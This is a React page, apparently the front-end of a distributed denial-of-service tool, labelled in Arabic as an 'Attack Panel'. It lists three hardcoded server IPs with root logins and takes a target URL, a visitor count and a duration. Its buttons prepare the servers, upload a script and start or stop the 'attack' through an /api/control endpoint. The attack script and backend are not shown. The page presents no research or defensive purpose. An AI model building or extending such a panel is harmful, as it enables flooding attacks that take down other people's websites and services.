'use client';
import { useState } from 'react';

export default function Home() {
  const [url, setUrl] = useState('');
  const [visitors, setVisitors] = useState('100');
  const [duration, setDuration] = useState('5');
  const [logs, setLogs] = useState([]);
  const [loading, setLoading] = useState(false);
  const [activeAction, setActiveAction] = useState('');
  const [showServerPanel, setShowServerPanel] = useState(false);
  const [servers, setServers] = useState([
    { host: '138.68.153.135', username: 'root' },
    { host: '188.166.159.196', username: 'root' },
    { host: '46.101.78.167', username: 'root' }
  ]);
  const [newHost, setNewHost] = useState('');
  const [newUsername, setNewUsername] = useState('root');

  const addLog = (msg) => setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...prev]);

  const addServer = () => {
    if (!newHost) return addLog('❌ الرجاء إدخال عنوان IP للسيرفر');
    if (servers.find(s => s.host === newHost)) return addLog('❌ هذا السيرفر موجود مسبقاً');
    setServers(prev => [...prev, { host: newHost, username: newUsername || 'root' }]);
    addLog(`✅ تمت إضافة السيرفر: ${newHost}`);
    setNewHost('');
    setNewUsername('root');
  };

  const removeServer = (host) => {
    setServers(prev => prev.filter(s => s.host !== host));
    addLog(`🗑️ تم حذف السيرفر: ${host}`);
  };

  const handleAction = async (action) => {
    if (action === 'start' && !url) return addLog('❌ خطأ: الرجاء إدخال الرابط أولاً');
    if (action === 'start' && !visitors) return addLog('❌ خطأ: الرجاء إدخال عدد الزوار');
    if (action === 'start' && !duration) return addLog('❌ خطأ: الرجاء إدخال المدة بالدقائق');
    if (servers.length === 0) return addLog('❌ خطأ: لا يوجد سيرفرات، أضف سيرفر أولاً');

    setLoading(true);
    setActiveAction(action);

    const actionNames = {
      setup: 'تجهيز السيرفرات',
      deploy: 'رفع السكريبت',
      start: 'بدء الهجوم',
      stop: 'إيقاف الكل'
    };

    addLog(`🚀 جاري ${actionNames[action]}...`);
    if (action === 'setup') {
      addLog('⏳ تجهيز السيرفرات قد يستغرق عدة دقائق، الرجاء الانتظار...');
    }
    if (action === 'start') {
      addLog(`📊 عدد الزوار: ${visitors} | المدة: ${duration} دقيقة`);
    }

    try {
      const res = await fetch('/api/control', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action, url, visitors: parseInt(visitors), duration: parseInt(duration), servers })
      });
      const data = await res.json();

      if (data.error) {
        addLog(`❌ خطأ: ${data.error}`);
      } else {
        data.results.forEach(r => {
          if (r.status === 'success') {
            addLog(`✅ ${r.host}: ${r.output || 'تم بنجاح'}`);
          } else {
            addLog(`❌ ${r.host}: ${r.error}`);
          }
        });
      }
    } catch (err) {
      addLog(`❌ خطأ في النظام: ${err.message}`);
    }
    setLoading(false);
    setActiveAction('');
  };

  const fontFamily = "'Courier New', 'Noto Sans Arabic', 'Segoe UI', Tahoma, monospace";

  const styles = {
    page: {
      minHeight: '100vh',
      backgroundColor: '#000',
      color: '#22c55e',
      padding: '32px',
      fontFamily: fontFamily,
      direction: 'rtl'
    },
    container: {
      maxWidth: '800px',
      margin: '0 auto',
      border: '1px solid #166534',
      padding: '24px',
      borderRadius: '8px',
      backgroundColor: '#111827'
    },
    title: {
      fontSize: '28px',
      fontWeight: 'bold',
      marginBottom: '24px',
      textAlign: 'center',
      borderBottom: '1px solid #166534',
      paddingBottom: '16px',
      color: '#22c55e'
    },
    serverToggle: {
      display: 'flex',
      alignItems: 'center',
      gap: '8px',
      fontSize: '14px',
      color: '#facc15',
      cursor: 'pointer',
      background: 'none',
      border: 'none',
      marginBottom: '12px',
      fontFamily: fontFamily
    },
    serverPanel: {
      border: '1px solid #14532d',
      borderRadius: '8px',
      padding: '16px',
      marginBottom: '16px',
      backgroundColor: '#000'
    },
    serverItem: {
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'space-between',
      backgroundColor: '#111827',
      padding: '8px 12px',
      borderRadius: '6px',
      fontSize: '14px',
      color: '#4ade80',
      marginBottom: '8px'
    },
    deleteBtn: {
      color: '#ef4444',
      cursor: 'pointer',
      background: 'none',
      border: 'none',
      fontSize: '16px',
      fontFamily: fontFamily
    },
    addServerRow: {
      display: 'flex',
      gap: '8px',
      marginTop: '12px'
    },
    input: {
      flex: 1,
      backgroundColor: '#000',
      border: '1px solid #166534',
      padding: '12px',
      borderRadius: '6px',
      color: '#fff',
      fontSize: '14px',
      fontFamily: fontFamily,
      outline: 'none'
    },
    inputSmall: {
      width: '100px',
      backgroundColor: '#000',
      border: '1px solid #166534',
      padding: '12px',
      borderRadius: '6px',
      color: '#fff',
      fontSize: '14px',
      fontFamily: fontFamily,
      outline: 'none'
    },
    addBtn: {
      display: 'flex',
      alignItems: 'center',
      gap: '4px',
      backgroundColor: '#14532d',
      color: '#fff',
      padding: '8px 16px',
      borderRadius: '6px',
      cursor: 'pointer',
      border: 'none',
      fontSize: '14px',
      fontFamily: fontFamily
    },
    label: {
      display: 'block',
      marginBottom: '8px',
      fontSize: '14px',
      color: '#22c55e'
    },
    urlInput: {
      width: '100%',
      backgroundColor: '#000',
      border: '1px solid #166534',
      padding: '12px',
      borderRadius: '6px',
      color: '#fff',
      fontSize: '16px',
      fontFamily: fontFamily,
      outline: 'none',
      boxSizing: 'border-box'
    },
    inputRow: {
      display: 'grid',
      gridTemplateColumns: '1fr 1fr',
      gap: '16px',
      marginTop: '16px'
    },
    numberInput: {
      width: '100%',
      backgroundColor: '#000',
      border: '1px solid #166534',
      padding: '12px',
      borderRadius: '6px',
      color: '#fff',
      fontSize: '16px',
      fontFamily: fontFamily,
      outline: 'none',
      boxSizing: 'border-box',
      textAlign: 'center'
    },
    inputGroup: {
      display: 'flex',
      flexDirection: 'column'
    },
    buttonGrid: {
      display: 'grid',
      gridTemplateColumns: 'repeat(4, 1fr)',
      gap: '12px',
      marginTop: '24px'
    },
    btnSetup: {
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      gap: '8px',
      backgroundColor: '#581c87',
      color: '#fff',
      padding: '16px 8px',
      borderRadius: '6px',
      cursor: 'pointer',
      border: 'none',
      fontSize: '13px',
      fontFamily: fontFamily,
      transition: 'background 0.2s'
    },
    btnDeploy: {
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      gap: '8px',
      backgroundColor: '#1e3a5f',
      color: '#fff',
      padding: '16px 8px',
      borderRadius: '6px',
      cursor: 'pointer',
      border: 'none',
      fontSize: '13px',
      fontFamily: fontFamily,
      transition: 'background 0.2s'
    },
    btnStart: {
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      gap: '8px',
      backgroundColor: '#7f1d1d',
      color: '#fff',
      padding: '16px 8px',
      borderRadius: '6px',
      cursor: 'pointer',
      border: 'none',
      fontSize: '13px',
      fontFamily: fontFamily,
      transition: 'background 0.2s'
    },
    btnStop: {
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      gap: '8px',
      backgroundColor: '#374151',
      color: '#fff',
      padding: '16px 8px',
      borderRadius: '6px',
      cursor: 'pointer',
      border: 'none',
      fontSize: '13px',
      fontFamily: fontFamily,
      transition: 'background 0.2s'
    },
    logsHeader: {
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'space-between',
      marginBottom: '8px',
      marginTop: '32px'
    },
    logsTitle: {
      fontSize: '14px',
      color: '#9ca3af'
    },
    clearBtn: {
      fontSize: '12px',
      color: '#6b7280',
      cursor: 'pointer',
      background: 'none',
      border: 'none',
      fontFamily: fontFamily
    },
    logsBox: {
      backgroundColor: '#000',
      border: '1px solid #14532d',
      height: '288px',
      overflowY: 'auto',
      padding: '16px',
      borderRadius: '6px',
      fontSize: '12px',
      fontFamily: fontFamily
    },
    logItem: {
      marginBottom: '4px',
      borderBottom: '1px solid #111827',
      paddingBottom: '4px'
    },
    placeholder: {
      color: '#4b5563'
    },
    noServers: {
      color: '#4b5563',
      fontSize: '14px',
      textAlign: 'center'
    },
    disabledBtn: {
      opacity: 0.5,
      cursor: 'not-allowed'
    }
  };

  return (
    <div style={styles.page}>
      <div style={styles.container}>
        <h1 style={styles.title}>
          ⚔️ لوحة تحكم الهجوم (Attack Panel)
        </h1>

        {/* Server Management */}
        <div style={{ marginBottom: '24px' }}>
          <button
            onClick={() => setShowServerPanel(!showServerPanel)}
            style={styles.serverToggle}
          >
            🖥️ إدارة السيرفرات ({servers.length} سيرفر) {showServerPanel ? '▲' : '▼'}
          </button>

          {showServerPanel && (
            <div style={styles.serverPanel}>
              <div>
                {servers.map((server, i) => (
                  <div key={i} style={styles.serverItem}>
                    <span>🖥️ {server.host} ({server.username})</span>
                    <button
                      onClick={() => removeServer(server.host)}
                      style={styles.deleteBtn}
                    >
                      🗑️
                    </button>
                  </div>
                ))}
                {servers.length === 0 && (
                  <p style={styles.noServers}>لا يوجد سيرفرات</p>
                )}
              </div>

              <div style={styles.addServerRow}>
                <input
                  type="text"
                  value={newHost}
                  onChange={(e) => setNewHost(e.target.value)}
                  placeholder="عنوان IP (مثال: 192.168.1.1)"
                  style={styles.input}
                />
                <input
                  type="text"
                  value={newUsername}
                  onChange={(e) => setNewUsername(e.target.value)}
                  placeholder="المستخدم"
                  style={styles.inputSmall}
                />
                <button onClick={addServer} style={styles.addBtn}>
                  + إضافة
                </button>
              </div>
            </div>
          )}
        </div>

        {/* Target URL */}
        <div>
          <label style={styles.label}>🔗 الرابط المستهدف (Target URL)</label>
          <input
            type="text"
            value={url}
            onChange={(e) => setUrl(e.target.value)}
            placeholder="https://example.com"
            style={styles.urlInput}
          />
        </div>

        {/* Visitors & Duration */}
        <div style={styles.inputRow}>
          <div style={styles.inputGroup}>
            <label style={styles.label}>👥 عدد الزوار</label>
            <input
              type="number"
              value={visitors}
              onChange={(e) => setVisitors(e.target.value)}
              placeholder="100"
              min="1"
              style={styles.numberInput}
            />
          </div>
          <div style={styles.inputGroup}>
            <label style={styles.label}>⏱️ المدة (بالدقائق)</label>
            <input
              type="number"
              value={duration}
              onChange={(e) => setDuration(e.target.value)}
              placeholder="5"
              min="1"
              style={styles.numberInput}
            />
          </div>
        </div>

        {/* Control Buttons */}
        <div style={styles.buttonGrid}>
          <button
            onClick={() => handleAction('setup')}
            disabled={loading}
            style={loading ? {...styles.btnSetup, ...styles.disabledBtn} : styles.btnSetup}
          >
            {activeAction === 'setup' ? '⏳' : '⚙️'} 0. تجهيز السيرفرات
          </button>

          <button
            onClick={() => handleAction('deploy')}
            disabled={loading}
            style={loading ? {...styles.btnDeploy, ...styles.disabledBtn} : styles.btnDeploy}
          >
            {activeAction === 'deploy' ? '⏳' : '📤'} 1. رفع السكريبت
          </button>

          <button
            onClick={() => handleAction('start')}
            disabled={loading}
            style={loading ? {...styles.btnStart, ...styles.disabledBtn} : styles.btnStart}
          >
            {activeAction === 'start' ? '⏳' : '▶️'} 2. بدء الهجوم
          </button>

          <button
            onClick={() => handleAction('stop')}
            disabled={loading}
            style={loading ? {...styles.btnStop, ...styles.disabledBtn} : styles.btnStop}
          >
            {activeAction === 'stop' ? '⏳' : '⏹️'} إيقاف الكل
          </button>
        </div>

        {/* System Logs */}
        <div>
          <div style={styles.logsHeader}>
            <span style={styles.logsTitle}>💻 سجل النظام (System Logs)</span>
            <button onClick={() => setLogs([])} style={styles.clearBtn}>
              مسح السجل
            </button>
          </div>
          <div style={styles.logsBox}>
            {logs.length === 0 ? (
              <span style={styles.placeholder}>بانتظار الأوامر...</span>
            ) : (
              logs.map((log, i) => (
                <div key={i} style={styles.logItem}>{log}</div>
              ))
            )}
          </div>
        </div>
      </div>
    </div>
  );
}
